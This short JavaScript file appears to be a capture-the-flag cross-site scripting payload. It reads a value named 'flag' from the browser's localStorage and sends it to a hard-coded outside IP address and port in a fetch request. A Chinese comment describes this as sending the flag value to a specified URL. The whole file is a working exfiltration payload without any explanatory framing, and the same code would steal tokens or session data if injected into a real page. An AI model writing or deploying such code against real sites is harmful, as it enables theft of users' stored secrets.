const flag = localStorage.getItem('flag');

// 发送 flag 值到指定的 URL
fetch(`http://47.236.114.193:9999?flag=${encodeURIComponent(flag)}`, {
    method: 'GET',
})
.then(response => response.text())
.then(data => console.log('Response:', data))
.catch(error => console.error('Error:', error));
